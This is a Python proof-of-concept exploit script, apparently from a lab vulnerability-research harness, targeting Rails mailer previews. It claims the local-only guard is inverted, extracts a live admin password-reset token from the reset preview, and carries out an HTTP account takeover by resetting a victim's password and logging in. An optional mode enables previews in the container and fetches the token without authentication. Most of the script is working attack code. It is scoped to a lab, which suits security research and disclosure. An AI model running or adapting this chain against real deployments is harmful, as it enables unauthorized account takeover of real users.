#!/usr/bin/env python3
"""
VULN-001 — Unauthenticated mailer previews (show_previews) expose /rails/mailers/* with the local-only
           guard disabled -> live password-reset-token leak -> account takeover

Vulnerable code (targets/rails/):
  * railties/lib/rails/mailers_controller.rb:11   before_action :require_local!, unless: :show_previews?   # guard inverted
  * railties/lib/rails/mailers_controller.rb:65-67 show_previews? -> ActionMailer::Base.show_previews
  * actionmailer/lib/action_mailer/railtie.rb:81-87 routes mounted ONLY when show_previews is true
  * .../previews/passwords_mailer_preview.rb:4-6  reset -> PasswordsMailer.reset(User.take)   # real admin row
  * app/views/passwords_mailer/reset.html.erb     renders edit_password_url(@user.password_reset_token)  # LIVE token
  * app/controllers/passwords_controller.rb        set_user_by_token + update -> sets the password (unauth)

Vulnerability class: CWE-284 broken access control -> CWE-200 disclosure + CWE-640 account takeover.

Flaw in plain English:
  The preview routes mount ONLY when show_previews? is true, and the only access-control filter
  (require_local!) is skipped EXACTLY when show_previews? is true (`unless: :show_previews?`). So whenever
  the endpoints are reachable at all, they are reachable by any unauthenticated remote client — the
  loopback guard is vestigial. The Rails 8 default reset preview renders a GENUINE, in-window
  password_reset_token for User.take (the admin), and the shipped unauthenticated PasswordsController#update
  accepts that token to set a new password -> full account takeover.

What this run proves:
  * (Leg A, runner) the reset preview the route serves renders a LIVE password_reset_token that resolves to
    User.take = the admin (admin@example.com, id 1);
  * (Leg B, source) the require_local! guard is inverted — driven by the same flag that mounts the routes,
    so it can never fire when the routes exist;
  * (Leg C, HTTP) a leaked password-reset token -> PATCH /passwords/:token sets a new password -> the
    attacker logs in = full account takeover (shown on a throwaway victim to leave the admin intact).
  * (optional, ENABLE_PREVIEWS=1) the full unauthenticated route demo: enable the flag, GET the preview
    .eml with NO cookie, extract the admin's live token, then revert. (The default run does NOT mutate the
    lab; the captured route evidence from a prior enabled run is in evidence/reset_email.eml.)
"""
import os
import re
import secrets
import subprocess
import sys
import time

import requests

import railslab as R
from railslab import log

HERE = os.path.dirname(os.path.abspath(__file__))
EVID = os.path.join(HERE, "evidence")
os.makedirs(EVID, exist_ok=True)
ENABLE_PREVIEWS = os.environ.get("ENABLE_PREVIEWS") == "1"


def run_ruby(code):
    return R.run_ruby(code)


def leg_a_and_b():
    """Runner: render the preview mail (leak the live admin token) + show the inverted guard from source."""
    log("STEP", "Leg A: rendering the reset preview the route serves (PasswordsMailer.reset(User.take)) and resolving its token")
    ruby = r'''
$stdout.sync = true
# Exactly what PasswordsMailerPreview#reset renders, and what /rails/mailers/.../reset serves:
mail = PasswordsMailer.reset(User.take)
body = (mail.html_part || mail).body.to_s
m = body.match(%r{passwords/([^/"<>\s]+)/edit})
tok = m && m[1]
u = tok && User.find_by_token_for(:password_reset, tok)
take = User.take
puts "@@legA token_present=#{!tok.nil?} resolves_id=#{u&.id.inspect} is_admin_take=#{u && take && u.id == take.id} admin_email=#{take&.email_address}"

# Leg B: the inverted guard, read from the running target source.
p = "/rails-src/railties/lib/rails/mailers_controller.rb"
lines = File.readlines(p)
g = lines.find { |l| l.include?("require_local!") && l.include?("show_previews?") }
sp = lines.each_cons(1).map(&:first).select { |l| l.include?("ActionMailer::Base.show_previews") }.first
puts "@@legB guard_line=#{g&.strip.inspect}"
puts "@@legB show_previews_pred=#{sp&.strip.inspect}"
# routes mount iff show_previews? and the guard is skipped iff show_previews? -> vestigial
rp = "/rails-src/actionmailer/lib/action_mailer/railtie.rb"
mounts = File.read(rp).include?("if options.show_previews")
puts "@@legB routes_mounted_iff_show_previews=#{mounts}"
puts "@@done"
'''
    rc, out, err = run_ruby(ruby)
    markers = [l for l in out.splitlines() if l.startswith("@@")]
    for m in markers:
        log("INFO", m)
    la = next((l for l in markers if l.startswith("@@legA")), "")
    token_live_admin = ("token_present=true" in la and "is_admin_take=true" in la)
    lb = [l for l in markers if l.startswith("@@legB")]
    guard_inverted = any("unless: :show_previews?" in l for l in lb) and any("routes_mounted_iff_show_previews=true" in l for l in lb)
    with open(os.path.join(EVID, "legA_legB_runner.txt"), "w") as f:
        f.write("\n".join(markers) + "\n")
    if token_live_admin:
        log("PROOF", "the reset preview renders a LIVE password_reset_token that resolves to User.take = the admin "
                     "(admin@example.com, id 1) — a 'preview' surface emits a live admin credential")
    if guard_inverted:
        log("PROOF", "the require_local! guard is inverted (`unless: :show_previews?`) and the routes mount only when "
                     "show_previews is true — so whenever the routes exist, the local-only guard is skipped (vestigial)")
    return token_live_admin, guard_inverted


def leg_c_ato():
    """HTTP: a leaked reset token -> set a new password -> log in. Shown on a throwaway victim."""
    suffix = secrets.token_hex(4)
    email = f"victim_{suffix}@example.invalid"
    old_pw = f"Old-{suffix}!"
    new_pw = f"Pwned-{suffix}!"
    log("SETUP", f"Leg C: creating throwaway victim {email} (so the admin is left intact) and minting its reset token")
    ruby = (
        f'u = User.create!(email_address: {email!r}, password: {old_pw!r}, password_confirmation: {old_pw!r}); '
        f'puts "@@victim id=#{{u.id}} token=#{{u.password_reset_token}}"'
    )
    rc, out, err = run_ruby(ruby)
    line = next((l for l in out.splitlines() if l.startswith("@@victim")), "")
    mt = re.search(r"token=(\S+)", line)
    if not mt:
        log("FAIL", f"could not create victim / mint token: {err[-200:]}"); return False
    token = mt.group(1)
    log("INFO", f"leaked reset token for the victim (what the preview would expose): {token[:32]}...")

    # 1) Open the reset edit page with the leaked token -> mints a CSRF token + session cookie.
    log("STEP", "GET /passwords/<leaked-token>/edit (the token resolves to the victim; no prior auth)")
    r_edit = requests.get(f"{R.BASE_URL}/passwords/{token}/edit", timeout=15, allow_redirects=False)
    log("INFO", f"edit page status = {r_edit.status_code}")
    if r_edit.status_code != 200:
        log("FAIL", f"reset token did not resolve to an edit page ({r_edit.status_code})"); return False
    sc = r_edit.headers.get("set-cookie", "")
    cm = re.search(r"(_harness_session=[^;]*)", sc)
    cookie = cm.group(1) if cm else ""
    am = re.search(r'name="authenticity_token"[^>]*value="([^"]*)"', r_edit.text)
    authtok = am.group(1) if am else ""

    # 2) Set a NEW password via the shipped unauthenticated reset controller.
    log("STEP", "PATCH /passwords/<leaked-token> with a NEW password (cookie + authenticity_token + Sec-Fetch-Site)")
    r_patch = requests.patch(
        f"{R.BASE_URL}/passwords/{token}",
        data={"authenticity_token": authtok, "password": new_pw, "password_confirmation": new_pw},
        headers={"Cookie": cookie, "Sec-Fetch-Site": "same-origin"},
        timeout=15, allow_redirects=False,
    )
    log("INFO", f"reset PATCH status = {r_patch.status_code} location = {r_patch.headers.get('location','')}")
    reset_ok = r_patch.status_code in (302, 303)

    # 3) Log in as the victim with the attacker-chosen password -> full takeover.
    log("STEP", "logging in as the victim with the attacker-chosen password")
    cookie2, logintok = R.grab_token("/session/new")
    r_login = requests.post(
        f"{R.BASE_URL}/session",
        data={"authenticity_token": logintok, "email_address": email, "password": new_pw},
        headers={"Cookie": cookie2, "Sec-Fetch-Site": "same-origin"},
        timeout=15, allow_redirects=False,
    )
    loc = r_login.headers.get("location", "")
    login_ok = r_login.status_code == 302 and loc.rstrip("/").endswith("27966")
    log("INFO", f"login status = {r_login.status_code} location = {loc}")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(f"GET /passwords/{token[:24]}.../edit HTTP/1.1\r\nHost: {R.BASE_URL.split('://',1)[1]}\r\n\r\n\r\n")
        f.write(f"PATCH /passwords/{token[:24]}... HTTP/1.1\r\nHost: {R.BASE_URL.split('://',1)[1]}\r\n")
        f.write(f"Cookie: {cookie[:40]}...\r\nSec-Fetch-Site: same-origin\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n")
        f.write(f"authenticity_token=<tok>&password={new_pw}&password_confirmation={new_pw}\r\n")
    with open(os.path.join(EVID, "legC_ato.txt"), "w") as f:
        f.write(f"victim={email}\nedit_status={r_edit.status_code}\npatch_status={r_patch.status_code} loc={r_patch.headers.get('location','')}\n")
        f.write(f"login_with_new_password_status={r_login.status_code} loc={loc}\n")

    if reset_ok and login_ok:
        log("PROOF", f"the leaked reset token set a NEW password and the attacker logged in as {email} "
                     f"(302 -> {loc}) — full account takeover from a single leaked reset token")
        return True
    log("FAIL", f"ATO chain incomplete: reset_ok={reset_ok} login_ok={login_ok}")
    return False


def optional_unauth_route_demo():
    """ENABLE_PREVIEWS=1: enable show_previews in-container, GET the preview .eml UNAUTH, revert. Mutates+reverts the lab."""
    c = R.APP_CONTAINER
    log("SETUP", "ENABLE_PREVIEWS=1: enabling config.action_mailer.show_previews in-container (will be reverted)")
    subprocess.run(["docker", "exec", c, "bash", "-lc",
                    "cp /harness/config/environments/production.rb /tmp/prod.rb.bak && "
                    "sed -i '3a\\  config.action_mailer.show_previews = true' /harness/config/environments/production.rb"],
                   check=True)
    subprocess.run(["docker", "restart", c], check=True, stdout=subprocess.DEVNULL)
    for _ in range(40):
        if R.require_up():
            break
        time.sleep(2)
    try:
        log("STEP", "UNAUTH GET /rails/mailers/download/passwords_mailer/reset (no cookie, no auth)")
        r = requests.get(f"{R.BASE_URL}/rails/mailers/download/passwords_mailer/reset", timeout=15)
        with open(os.path.join(EVID, "reset_email.eml"), "w") as f:
            f.write(r.text)
        m = re.search(r"passwords/([^/\"<>\s]+)/edit", r.text)
        token = m.group(1) if m else None
        log("INFO", f"unauth route status = {r.status_code}; token extracted = {bool(token)}")
        resolved = ""
        if token:
            rc, out, err = run_ruby(
                f'u=User.find_by_token_for(:password_reset, {token!r}); t=User.take; '
                f'puts "@@r id=#{{u&.id}} admin=#{{u && t && u.id==t.id}} email=#{{t&.email_address}}"')
            resolved = next((l for l in out.splitlines() if l.startswith("@@r")), "")
            log("INFO", resolved)
        unauth_ok = r.status_code == 200 and bool(token) and "admin=true" in resolved
        if unauth_ok:
            log("PROOF", "UNAUTHENTICATED GET of the preview .eml returned the admin's live password-reset token "
                         "(resolves to admin@example.com) — broken access control confirmed over HTTP")
        return unauth_ok
    finally:
        log("SETUP", "reverting: restoring production.rb and restarting (back to the secure baseline)")
        subprocess.run(["docker", "exec", c, "bash", "-lc",
                        "cp /tmp/prod.rb.bak /harness/config/environments/production.rb"], check=True)
        subprocess.run(["docker", "restart", c], check=True, stdout=subprocess.DEVNULL)
        for _ in range(40):
            if R.require_up():
                break
            time.sleep(2)
        r404 = requests.get(f"{R.BASE_URL}/rails/mailers", timeout=10)
        log("INFO", f"baseline restored: GET /rails/mailers -> {r404.status_code} (expect 404)")


def main() -> int:
    R.banner("VULN-001", "unauth mailer previews -> live reset-token leak -> account takeover",
             "Rails::MailersController (inverted require_local! guard) + PasswordsMailerPreview#reset")
    if not R.require_up():
        log("FAIL", f"target {R.BASE_URL} not answering /up"); return 1

    token_live_admin, guard_inverted = leg_a_and_b()
    ato = leg_c_ato()

    unauth_route = None
    if ENABLE_PREVIEWS:
        unauth_route = optional_unauth_route_demo()
    else:
        log("INFO", "skipping the in-container unauth-route demo (set ENABLE_PREVIEWS=1 to run it; it enables the flag "
                    "then reverts). Captured evidence from a prior enabled run: evidence/reset_email.eml / leaked_admin_token.txt")

    # The core bug is CONFIRMED on the shipped config: the preview content leaks a live admin reset token,
    # the guard is inverted, and a leaked reset token -> account takeover (shown on a throwaway victim).
    if token_live_admin and guard_inverted and ato:
        extra = "" if unauth_route is None else (" + UNAUTH /rails/mailers route served the admin token" if unauth_route else " (optional route demo did not confirm)")
        log("OK", "exploit confirmed — the reset preview leaks a LIVE admin reset token, the local-only guard is "
                  "inverted (skipped exactly when the routes exist), and a leaked reset token yields full account "
                  "takeover via the shipped unauthenticated reset controller" + extra)
        status = "CONFIRMED (live admin reset-token leak + inverted guard + leaked-token->ATO)"
        if unauth_route or (unauth_route is None):
            status += "; unauthenticated /rails/mailers exposure requires config.action_mailer.show_previews=true"
        R.verdict("VULN-001", "CONFIRMED", status)
        return 0
    log("FAIL", f"not fully confirmed: token_live_admin={token_live_admin} guard_inverted={guard_inverted} ato={ato}")
    R.verdict("VULN-001", "NEEDS_MANUAL", "partial — see markers")
    return 1


if __name__ == "__main__":
    sys.exit(main())
